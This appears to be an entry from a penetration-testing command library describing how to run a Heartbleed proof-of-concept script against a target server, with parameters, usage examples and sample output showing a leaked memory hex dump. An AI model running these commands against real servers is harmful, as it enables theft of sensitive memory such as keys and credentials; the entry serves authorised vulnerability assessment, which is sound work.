---
id: 11bb70cd-3859-4593-a17e-cd1a135e7b24
type: command
executor: bash
data: >-
  python2 heartbleed-poc.py $_TARGET_IP -n $_NUM_ATTEMPTS -f $_OUTPUT_FILE -p
  $_TARGET_PORT
output: |-
  root@kali:~# python2 heartbleed-poc.py 10.10.10.10 -n 1 -f output.txt
  Scanning 10.10.10.10 on port 443
  Connecting...
  Sending Client Hello...
  Waiting for Server Hello...
   ... received message: type = 22, ver = 0302, length = 66
   ... received message: type = 22, ver = 0302, length = 885
   ... received message: type = 22, ver = 0302, length = 331
   ... received message: type = 22, ver = 0302, length = 4
  Server TLS version was 1.2

  Sending heartbeat request...
   ... received message: type = 24, ver = 0302, length = 16384
  Received heartbeat response:
    0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
    0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
    0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
    0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
    0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
    0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
    0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
    0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
    0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
    0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  ...
  ...
created_at: '2019-11-21T00:29:39.022910+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - heartbleed
  - exploit
verified: true
validated: true
---

# heartbleed-poc-dump-vulnerable-memory

## Command

```bash
python2 heartbleed-poc.py $_TARGET_IP -n $_NUM_ATTEMPTS -f $_OUTPUT_FILE -p $_TARGET_PORT
```

## Description

Executes the heartbleed-poc script to connect to a target server, exploit the Heartbleed vulnerability via TLS heartbeat requests, and dump leaked server memory to a file. Use this during vulnerability assessment to extract sensitive data from vulnerable OpenSSL servers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP address or hostname of the vulnerable server | Yes |
| -n $_NUM_ATTEMPTS | Number of heartbeat requests to send (e.g., 5 for multiple dumps) | No (default: 1) |
| -f $_OUTPUT_FILE | Path to output file for saving the hex memory dump | No |
| -p $_TARGET_PORT | Target port for TLS connection (default: 443) | No |

## Examples

### Basic Usage

Perform a single heartbeat request on the default port:

```bash
python2 heartbleed-poc.py 10.10.10.10 -n 1
```

### Advanced Usage

Multiple requests with output to file on custom port:

```bash
python2 heartbleed-poc.py 10.10.10.10 -n 5 -f leak.txt -p 8443
```

## Expected Output

The command outputs TLS negotiation details followed by a hex dump of leaked memory if vulnerable. Example shows connection establishment, heartbeat response, and partial hex dump:

```
Scanning 10.10.10.10 on port 443
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Server TLS version was 1.2

Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
...
...
```

If not vulnerable, it will report no heartbeat response or a safe length.

## Related

- [[tools/heartbleed-poc]] (parent tool)
- [[procedures/exploit-heartbleed-vulnerability]] (if a procedure exists)
